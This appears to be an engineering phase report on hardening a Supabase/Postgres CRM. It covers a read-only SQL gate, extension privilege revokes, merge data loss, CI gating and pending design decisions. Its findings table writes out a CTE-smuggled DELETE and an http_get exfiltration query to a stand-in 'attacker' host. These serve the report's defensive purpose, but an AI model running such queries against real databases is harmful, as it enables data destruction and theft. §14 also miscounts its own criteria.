# Phase 0.5 Report — Foundation hardening

**Date:** 2026-09-11 · **Branch:** `feature/clinical-phase-1` · **Base commit:** `729f5966`

> **Status: NOT signed off.** Every database-level guarantee in this report is **unverified** — the Docker daemon is not running, so no migration has been applied, no RLS assertion executed, and no storage state observed. See [§11](#11-docker-blocked-verification) and [§14](#14-exact-criteria-for-phase-05-completion).
>
> **Update 2026-09-11 — Phase 0.5B attempted the verification and could not complete it.** Docker Desktop 4.89.0 is broken on this machine for a reason unrelated to this repository (socket creation produces files the system cannot access, across two independent subsystems; three antivirus products are stacked). Every non-destructive remediation available without administrator rights was attempted and failed. Work is checkpointed at commit `d3280333`. Full diagnosis, remediation options ranked by data-loss risk, and the revised signoff position: [PHASE_0_5B_DATABASE_VERIFICATION.md](PHASE_0_5B_DATABASE_VERIFICATION.md).

**Method.** Every security-sensitive finding was reproduced on this machine before any code changed. Investigation ran as five parallel agents, each followed by an adversarial reviewer; every proposal was re-checked by hand before being applied, and three were rejected or materially amended ([§2.4](#24-proposals-rejected-or-amended-after-review)).

---

## 1. Initial confirmed problems

Reproduced, not taken on trust.

| # | Problem | How it was proven |
| --- | --- | --- |
| P1 | **`validateSql` accepted DML.** `WITH x AS (SELECT 1) DELETE FROM contacts` passed the read-only gate. | Probe against the pinned `pgsql-ast-parser@12`: collected `{with, select}` while `stmts[0].in.type === "delete"` |
| P2 | **The database is an egress channel.** `SELECT extensions.http_get('http://attacker/?d=' \|\| (SELECT ...))` is syntactically read-only, satisfies RLS, and posts rows off-box. | Probe re-implementing the gate verbatim: 9 network payloads all passed |
| P3 | **No grant layer ever mentioned `extensions` or `net`.** Privileges on every network-capable function were PostgreSQL defaults. | `grep` over `05_policies.sql` / `06_grants.sql` → no match; every REVOKE is scoped `in schema public` |
| P4 | **`http_set_curlopt` is session-scoped and the MCP pool has ONE connection.** `CURLOPT_PROXY` would survive `COMMIT` into the next user's transaction — a cross-tenant channel. | Gate probe passes; `mcp/index.ts:25` `new Pool(connectionString, 1)` |
| P5 | **`merge_contacts` destroyed a lead profile on every merge**, including `do_not_contact`. | 4 FKs reference `contacts`, **all** `ON DELETE CASCADE`; a trigger creates exactly one `lead_profiles` row per contact, so both sides always have one and the loser's always cascades away |
| P6 | **`validate-on-stop` validated nothing on Windows.** | Its worktree filter compared git-reported POSIX paths against `join()`-built ones; confirmed by mutation test |
| P7 | **The `claude` test project never ran in CI.** | `check.yml` ran only `test:unit:app` and `test:unit:functions` |
| P8 | **`canAccess` ended in `return true`** — every unanticipated resource allowed, including every future engine resource. It had no test at all. | Read in full |
| P9 | **The attachments bucket was open in every migrated database** while the docs said "closed". | The intent is DML (`update storage.buckets`), which `db diff` cannot emit |
| P10 | **Two tenant-vocabulary CHECKs** (`deals.pipeline_stage`, nine values; `lead_profiles.operational_status`, five). | `grep -rln` over `supabase/migrations/` → **neither is in any migration**, so nothing had to be reversed |

---

## 2. Changes made

68 files. No mass formatting, no cosmetic refactors, no new dependencies.

### 2.1 Workstream A — safety checkpoint

Before anything wide-ranging: a local recovery point at the session scratchpad — a `git bundle` of all refs (**verified**: *"The bundle records a complete history"*), a patch of the tracked working tree, and copies of the untracked files. Nothing was pushed; no destructive git command was run at any point in this phase.

**Recommended checkpoint procedure** (the owner runs this — agents never push):

```bash
git add -A && git commit -m "chore: phase 0.5 foundation hardening"
git push -u origin feature/clinical-phase-1
```

Then open a PR. That is the **first CI run these commits will ever get**, and `check.yml` now includes the harness project.

### 2.2 Workstream B — Windows validation and CI gates

- **`toGitPath()`** added to `.claude/hooks/lib/paths.mjs`: absolutises **and** folds separators; the identity function on POSIX. Absolutising is required, not cosmetic — `TMP_ROOT` defaults to the literal `"/tmp"`, which Windows resolves drive-relative while git always reports absolute.
- Applied at the remaining call sites and **consolidated**: the local copy in `cleanup-worktree.mjs` now imports the shared helper, so there is one implementation instead of four.
- `cleanup-worktree.mjs`'s workspace-folder comparison fixed (git-form vs `join()`-form).
- **CI now runs the `claude` project.** `pending-deploys.test.mjs` also collects again — a `server.deps.external` entry in `vitest.config.ts`, because the script is a `755` executable whose `#!` hashbang becomes a `SyntaxError` once Vitest wraps the module in a function body.
- **`deploy.yml` is gated.** A new `gate` job runs typecheck, lint and all three unit projects; all three deploy jobs carry `needs: gate`. YAML validated by parsing.

### 2.3 Workstreams C–J

| Workstream | Change |
| --- | --- |
| **C — SQL read-only** | Two independent layers. `SET TRANSACTION READ ONLY` on the query path, so Postgres rejects writes regardless of the validator, with `readOnly` **defaulting to true** so a future call site that forgets its intent fails safe. Plus: the AST classifier recurses into **both** halves of a `WITH`, caps recursion depth, and treats unrecognised node shapes as disallowed. |
| **D — extensions / SSRF** | Hand-written migration revoking EXECUTE on **every member** of `http`, `pg_net` and `dblink`, driven off `pg_depend` rather than a signature list — a static list fails open the moment an extension update adds a function. Blanket revoke on schema `net` (guarded on existence; `net._http_response` holds every response body the database ever fetched). USAGE on `extensions` deliberately **kept**: `companies.website` and `sales.email` are `citext`, and filtering resolves the operator by name. Ends with an assertion that fails the migration if any application role can still execute one. |
| **E — merge_contacts** | Re-points `acquisition_attributions`; folds the two `lead_profiles` rows instead of letting one cascade away. Consent rule extracted to a pure, tested function. |
| **G — attachments** | Hand-written migration closing the bucket, dropping the three blanket policies, and **asserting** the end state so `db reset` fails loudly if it is ever reopened. `07_storage.sql` now says plainly that nothing in it reaches a database through `db diff`. |
| **H — fail closed** | `canAccess` inverted to an explicit allow-list. Unknown resource → denied, for every action and every role. |
| **J — pipelines** | Both tenant-vocabulary CHECKs removed from the declarative schema. `[db.migrations] schema_paths` wired into `config.toml` (six files in dependency order; `07_storage.sql` excluded because it is DML). |

### 2.4 Proposals rejected or amended after review

Recorded because *"an agent suggested it"* is not evidence:

- **Workstream F (Postmark) — REJECTED, not applied.** The artifact was incomplete (two functions imported but defined nowhere; one file truncated mid-statement) and the fix **introduced its own fail-open**: a recipient whose ingestion returned `transient` had its outcome discarded by an early `return` inside the loop. The core design — one ledger table with a unique index on `MessageID`, claim-before-work CAS, and an outcome fold — is sound and kept for a follow-up. **The bug remains open.**
- **Workstream D — amended before applying.** Three of four anchors did not match (CRLF), the proposed migration filename **collided with the one written earlier in this same session**, and both new files were truncated — one *silently*, ending mid-comment so it would have applied cleanly while shipping nothing. Rewritten by hand.
- **Workstream B — 4 of 11 edits refused.** They were not Windows defects and therefore fell outside the narrow exception the owner granted. The reviewer also demonstrated the headline fix **does not close the hole on this checkout**: the repo path contains a space (`D:/download/CRM - claude`) and the guard regex uses `\S*`, which cannot cross one.

---

## 3. Security fixes

| Fix | Layer | Verified? |
| --- | --- | --- |
| CTE-attached DML rejected by the read-only gate | Application (AST) | ✅ 7 adversarial tests, **mutation-verified** |
| Writes impossible on the query path regardless of the validator | **Database** (`SET TRANSACTION READ ONLY`) | ❌ needs Docker |
| Network-capable extension functions revoked from application roles | **Database** (privileges) | ❌ needs Docker |
| `net` schema and its response-body tables revoked | **Database** | ❌ needs Docker |
| Attachments bucket closed, with an assertion | **Database** | ❌ needs Docker |
| Unknown resource denied in the frontend gate | Application | ✅ 24 tests |
| `validate-on-stop` actually validates | Harness | ✅ 4 tests, **mutation-verified** |
| A red build cannot deploy | CI | ⚠️ YAML parses; unproven until a push |

**The honest summary:** every fix that lands in the *application* layer is tested and green today. Every fix that lands in the *database* layer is written and unverified. That asymmetry is the single reason this phase is not signed off.

**Defence in depth is real here, not a slogan:** P1 is closed at both the parser and the transaction level, and P2 is closed at the privilege level precisely because no parser rule can close it — `SET TRANSACTION READ ONLY` does not stop a network call, since it is not a database write.

---

## 4. Data-integrity fixes

**`merge_contacts` (P5)** — LGPD-relevant, and the worst kind of bug: it destroyed data silently, because a cascade raises nothing.

All four FKs referencing `contacts` are `ON DELETE CASCADE`. The function re-pointed only `tasks` and `contact_notes`, then deleted the loser. So every merge destroyed:

- the loser's **`lead_profiles` row**, including **`do_not_contact`** — a consent opt-out;
- the loser's entire **`acquisition_attributions`** trail (source / medium / campaign / gclid / utm_*), the only reason that table exists.

Not an edge case: a trigger creates exactly one lead profile per contact, so **both** sides always have one and the loser's was **always** cascaded away.

**The consent rule is `OR`, never "winner wins".** If either side opted out, the merged contact is opted out. An opt-out is not recoverable by guessing, and silently re-enabling contact because the surviving row happened to be the one the user clicked is the incident. The rule is symmetric by test, so the outcome cannot depend on merge direction.

Timestamps fold deterministically: earliest `acquired_at` (when the person was first seen at all), latest `last_interaction_at` (the most recent real signal), earliest `next_action_at` (dropping it would drop a commitment).

⚠️ **`lead_profiles` and `acquisition_attributions` exist in no migration**, so this fix is correct against the declarative schema and cannot be exercised against a real database until that migration is generated.

---

## 5. Tenancy design (Q11)

Recorded in **[ADR 0012](adr/0012-worker-tenant-context.md)** — designed, **not built**.

The problem the owner identified is real and was verified: [ADR 0002](adr/0002-tenancy-model.md) told every `ops` policy to route through a helper "following `02_functions.sql:462-511`", and **every one of those helpers resolves through `auth.uid()`** — a JWT claim. The worker of [ADR 0001](adr/0001-runtime-execution-substrate.md) holds no JWT, so the cited pattern cannot supply tenant context to the only process that touches `ops.*`.

**The decision:** a dedicated non-superuser role (`ops_worker`, no `BYPASSRLS`) plus a **transaction-scoped** GUC — `set_config('app.tenant_id', …, true)`, so the value dies with the transaction and cannot leak into the next job on a pooled connection. **The tenant id comes from the leased job row, never from an argument** — not from an LLM output, a webhook payload, or a tool parameter. That is what makes it server-side by construction: the only way to influence it is to already have written a row RLS let you write.

**Fails closed in the database:** `current_setting(..., true)` returns NULL when unset, and every policy is written so a NULL tenant matches **no rows** — not all rows. With `force row level security`, a worker that forgets the GUC sees an empty database rather than everyone's data.

Rejected: a synthetic per-tenant JWT (conflates *which human* with *which tenant*); a `BYPASSRLS` worker with filtering in application code (one missing `WHERE` is a cross-tenant leak with no backstop); role-per-tenant (kept for a future high-assurance tenant).

---

## 6. MCP decision (Q12)

Recorded in **[ADR 0011](adr/0011-mcp-trust-boundary.md)** — **Accepted**, since the owner decided it verbatim.

**The MCP function is development/admin tooling and is explicitly not part of the production trust boundary.** No production browser, end user or AI agent reaches arbitrary SQL through it.

This forced a correction elsewhere: ADR 0002 claimed the engine would be *"unreachable from any browser by construction"*. That was **false** — the PostgREST allowlist governs one channel, while the MCP function holds a direct libpq **superuser** connection that ignores it, and a superuser ignores `force row level security` too. The claim is retracted in place and narrowed to "unreachable *through PostgREST*". **Any Phase-2 isolation test must exercise both channels**; a PostgREST-only test proves nothing about the second.

Done now: the read path is doubly constrained (§3). **Not** done: the long-term Tool Gateway — explicit operations, least privilege, tenant scope, permission checks, risk classification, approval policy, audit log, structured inputs. It is Phase-1 engine work and was not needed for remediation.

**Standing rule:** `ops` must not exist while this function can reach it unrestricted. Settle its fate — remove, downgrade to a least-privilege role, or gate to non-production — **before** the engine schema lands.

---

## 7. Pipeline decision (Q4)

Recorded in **[ADR 0013](adr/0013-pipeline-stages-are-configuration.md)** — **Accepted**.

**The database validates generic structural integrity; business-stage semantics are data.**

The decisive fact made this cheap: **neither CHECK exists in any migration.** They lived only in the declarative schema, which has never reached a database. So the safest forward strategy was not a reversing migration — it was removing them **before** the first migration is generated, so they never enter history. No applied migration was rewritten, honouring the project's own rule.

Still enforced, because it is structural and domain-neutral: `pipeline_stage text not null default 'new_lead'`, its partial index, and `deals_lost_requires_reason`. Still legitimately enumerated: `sales.role in ('owner','operator')` — *engine* vocabulary, identical for every tenant. The test for whether a CHECK belongs: **would tenant two need a different set?**

The tenant-scoped `pipelines` / `pipeline_stages` model is designed in the ADR and deliberately **not built**: "company-scoped" needs a tenant discriminator, and none exists (Phase 2). Building it now would either hardcode single-tenancy or pre-empt that phase.

**Also fixed:** `deals_sample.csv` — the file the app's own "Download CSV sample" link hands users — still named upstream stages, so importing it dropped every deal into *Novo lead* silently. A regression test now pins both sample CSVs against the live configuration, and is mutation-verified.

⚠️ **Still open:** `stage` vs `pipeline_stage` duplication. `synchronize_deal_pipeline` force-overwrites `stage` on every write, so any non-Atomic writer has its write silently discarded. Resolving it needs a data migration and is its own change.

---

## 8. Kill-switch design

Recorded in **[ADR 0010](adr/0010-cost-control-and-kill-switch.md)** — **designed, not built**, and that gap is deliberate.

**Scopes**, evaluated most-specific-first but with **any** matching stop winning — a switch can only subtract capability: `global`, `company` (tenant), `department`, `agent`, `integration`/`tool`. The integration scope matters most in a real incident: the need is usually *"stop messaging patients"*, not *"stop agent 7"*.

**Invariants:** deny wins, with **no override flag** — an escape hatch is how a kill switch becomes advisory. **Fails closed on an unreadable switch** (database unreachable → *stopped*), because a switch that fails open during an outage is worthless exactly when needed. **Enforced in deterministic pre-flight** in the worker, before any provider call — never by asking a model to stop. **Observability and administration stay up**: it blocks new autonomous external actions, not reads, the UI, the audit log, or the owner's ability to diagnose.

**Already-running jobs:** tripping does not kill in-flight work mid-transaction (a half-applied external action is worse than a completed one). No new job is leased; a running job stops at its next step-boundary pre-flight; any step whose next act is an external side effect re-checks immediately before it and aborts there, resumable. The trip is recorded with who, when, why, and everything refused while active. Un-tripping is the same audited act.

**Why not built:** the enforcement point is the worker's pre-flight, and there is no worker, no `ops` schema and no agent runtime. Implementing it now would mean either inventing a home for engine code (Q13, deliberately undecided) or shipping a module with no caller and no way to prove it enforces anything. Both are worse than an explicit, dated gap.

---

## 9. Tests added

| Area | Tests | Proves |
| --- | --- | --- |
| `validateSql` adversarial | 7 | CTE attached to DELETE/UPDATE/INSERT, schema-qualified, nested, comment/whitespace-split, with RETURNING — all rejected. **Mutation-verified:** reverting the fix fails exactly these 7 |
| `canAccess` | 24 | Allow-list membership; **unknown resource denied** for every action and role, including future engine names (`ops_agents`, `ops_audit_log`, `ops_approvals`, cost tables) |
| `mergeLeadProfile` | 12 | Consent is `OR` across all four combinations; null/undefined cannot clear a real opt-out; **symmetric** — merge direction cannot change consent; timestamp folding |
| `toGitPath` / `sanitizePath` | 10 | POSIX identity (guards the real deployment target); Windows absolutisation; idempotence; both separator spellings canonicalise identically |
| `getActiveWorktrees` | 4 | Finds real worktrees on this platform; excludes another session's; does not match a prefix-sharing sibling. **Mutation-verified:** reverting the fix fails 2 |
| Sample CSVs | 6 | Every sample row names a stage and category the live configuration has, and not all rows collapse to the fallback stage. **Mutation-verified** |

**63 tests added.** Four suites were verified by mutation — reverting the fix and confirming the tests fail — because a test that passes before and after the fix proves nothing.

---

## 10. Test results

Run on this machine, 2026-09-11.

| Gate | Before Phase 0.5 | After |
| --- | --- | --- |
| `npm run typecheck` | ✅ | ✅ **PASS** |
| `npm run lint` | ✅ | ✅ **PASS** |
| `vitest --project app` | 189 passed | ✅ **219 passed**, 1 skipped |
| `vitest --project functions` | 108 passed | ✅ **127 passed** |
| `vitest --project claude` | 178 passed / **47 failed** | ✅ **275 passed**, 1 skipped |
| **Total** | 475 passed / 47 failed | ✅ **621 passed, 0 failed** |
| e2e | ❌ not run | ❌ **still not run** — needs Docker |
| `supabase db reset` / `db diff` | ❌ broken | ❌ **not runnable** — needs Docker |

CI now exercises all three unit projects, and no deploy job can start until they pass.

---

## 11. Docker-blocked verification

**No database guarantee in this report has been observed.** `docker info` fails on the named pipe. Nothing below was run, and no result is claimed.

**Preflight — and note `db reset` is independently red today:** `seed.sql:105` inserts into `loss_reasons`, which no migration creates. Fix that first, by hand, or `supabase start` will not come up. (This also blocks `.claude/scripts/apply-migrations.mjs`, so the harness cannot package the migration either.)

```bash
docker info
npx supabase start
npx supabase migration up --local
```

Then, in order:

1. **Migrations apply cleanly**, including the two hand-written ones. Both end in assertions, so a failure is loud: `20260911120000_close_attachments_bucket.sql`, `20260911130000_revoke_network_extension_privileges.sql`.
2. **Storage state** — `select public from storage.buckets where id='attachments'` is `false`; the three `Attachments 1mt4rzk_*` policies are gone.
3. **Extension lockdown** — enumerate what actually exists (`\dx`), then confirm no application role can execute any member of `http` / `pg_net` / `dblink`, and that `SELECT extensions.http_get('http://127.0.0.1/')` is refused as `authenticated`.
4. **The `citext` regression this could cause** — filtering `companies.website` and `sales.email` must still work (the reason USAGE on `extensions` was kept).
5. **`SET TRANSACTION READ ONLY`** actually refuses a write on the MCP query path.
6. **`db diff` is empty** after `schema_paths` is wired — and the generated migration reviewed line by line before it is applied anywhere.
7. **`merge_contacts`** — an integration test proving no dependent row disappears: `do_not_contact` survives from either side, and the loser's attribution rows are re-pointed rather than cascaded.
8. **RLS / tenant isolation** — still **zero** policy assertions exist anywhere in the repo. This is the largest remaining test gap.
9. **e2e**, after the four known reasons it is red are cleared.

---

## 12. Remaining risks

Ranked by what an attacker or an accident reaches first.

| # | Risk | Why it is still open |
| --- | --- | --- |
| R1 | **Postmark webhook still returns 200 on every ingestion failure** — no retry, no durable record, silent data loss. | The proposed fix was rejected as incomplete and fail-open (§2.4) |
| R2 | **Every database fix is unverified.** | Docker |
| R3 | **MCP: no audience check on `jwtVerify`; `get_schema` runs without the role downgrade; full SQL logged verbatim** (personal data, LGPD); `x-forwarded-host` trusted. | Out of the remediation scope agreed for this phase |
| R4 | **`http_set_curlopt` cross-tenant channel** is closed only if the revoke migration actually applies. | Docker |
| R5 | **`pg_sleep` DoS** — pool size 1, no `statement_timeout` on that path. | Not addressed |
| R6 | **Secrets committed by design** — `.gitignore` un-ignores `supabase/functions/.env`; an EC private key is tracked in `signing_keys.json`; `.env.development` and `.env.e2e` match no ignore pattern. | Rotation is its own change |
| R7 | **Owner bootstrap deadlock** in the declarative model; the migrated model makes the first signup an administrator. Two contradictory auth models. | Phase 1 security work |
| R8 | **`delete_note_attachments`** lets any authenticated user delete any file via the service role; **`users`/`patchUser`** mutates auth email and ban state before the owner check. | Not addressed |
| R9 | **Three harness path defects remain**, plus a shell-quoting hole the reviewer proved: this repo's path contains a space, and the guard regex cannot cross one. | 4 of 11 edits fell outside the authorised exception |
| R10 | **No RLS test has ever been written.** | The policy layer is the security boundary and it is entirely unasserted |
| R11 | **The branch has never been pushed and CI has never run on it.** | Owner action |

---

## 13. Remaining proposed ADRs

Full reconciliation in [DECISIONS.md](DECISIONS.md). Three are `Accepted` (0007, plus 0011 and 0013 decided by the owner); **ten remain `Proposed`**.

**Blocking, very high reversal cost:**

- **[0001](adr/0001-runtime-execution-substrate.md)** — Postgres queue + always-on worker. Rewrites every tool call if reversed.
- **[0002](adr/0002-tenancy-model.md)** — ⚠️ contained a materially false security claim, now retracted in place. **Cannot be accepted before 0012**, which supplies the mechanism it depends on.
- **[0012](adr/0012-worker-tenant-context.md)** — the tenancy mechanism. The owner decided the *principle*; the mechanism is this document's proposal.

**Also awaiting approval:** 0003 (identifiers), 0004 (principals), 0005 (`ra-core` boundary), 0006 (declarative schema workflow), 0008 (fork posture), 0009 (governance envelope), 0010 (cost + kill switch).

**Q13 (repository structure) — no decision, as instructed.** Three options with costs and a recommendation: [proposals/0001-repository-structure.md](proposals/0001-repository-structure.md). Recommendation is **incremental workspaces, started at Phase 2**, because nothing forces the decision now and a full monorepo migration has the highest reversal cost on the list.

---

## 14. Exact criteria for Phase 0.5 completion

Phase 0.5 is done when **all** of these are true. Today, 6 of 12.

| # | Criterion | Status |
| --- | --- | --- |
| 1 | typecheck, lint, and all three unit projects pass | ✅ 621 passed, 0 failed |
| 2 | CI exercises all three unit projects | ✅ |
| 3 | A red build cannot deploy | ✅ (unproven until a push) |
| 4 | Read-only SQL enforced at both the parser and the database | ⚠️ code ✅, database unverified |
| 5 | `canAccess` denies unknown resources, with tests | ✅ |
| 6 | Harness gates actually run on this platform, with tests | ✅ |
| 7 | **`supabase db reset` succeeds from scratch** | ❌ `seed.sql` / `loss_reasons` |
| 8 | **`supabase db diff` is empty**, and the generated migration reviewed | ❌ Docker |
| 9 | **Storage and extension lockdown verified against a live database** | ❌ Docker |
| 10 | **`merge_contacts` proven to lose no dependent row** | ❌ Docker |
| 11 | **At least one RLS/tenant-isolation test exists and passes** | ❌ none exists |
| 12 | **The branch is pushed and green in CI** | ❌ owner action |
| 13 | **Postmark ingestion no longer loses data silently** | ❌ fix rejected, redo needed |

**Recommendation: do not sign off.** Items 7–13 are not paperwork — they are the difference between "the code says it is safe" and "the database enforces it". The phase's own premise was that the baseline is not yet trustworthy enough for autonomous systems; declaring it trustworthy while every database guarantee is unverified would repeat exactly the error this audit found in the Phase-0 documents.

---

## 15. Recommended Phase 1 scope

**Not the Company OS engine.** Phase 1 should be the security floor the baseline still lacks — the work items 7–13 above imply, plus the auth model.

1. **Unblock the database.** Fix `seed.sql`, get `db reset` green, generate and review the single pending migration. Everything else is gated on this.
2. **Close the auth contradiction.** Decide which of the two models is real, then build a deliberate, auditable owner-provisioning path. Today no owner can be created in the declarative model, which makes tag creation and settings writes dead.
3. **Write the first RLS test suite** — owner, operator and anon, asserting scoped reads, denied writes and admin-only mutations. This is the highest-value test debt in the repository and it has never existed.
4. **Redo Postmark ingestion properly** (R1), with the rejected design's core and the fail-open removed.
5. **Settle the MCP function's fate** (ADR 0011) — it must be resolved **before** `ops` exists, not after.
6. **Rotate the committed secrets** and remove the `.gitignore` negation.
7. **Approve or reject ADRs 0001, 0002 and 0012 together** — they are one decision in three parts, and Phases 2–3 are built on them.

Only after that should Phase 2 (the `ops` schema and tenancy) begin. The sequencing rule that matters: **no engine table before tenancy is decided, and no agent before the kill switch and cost ledger exist.**
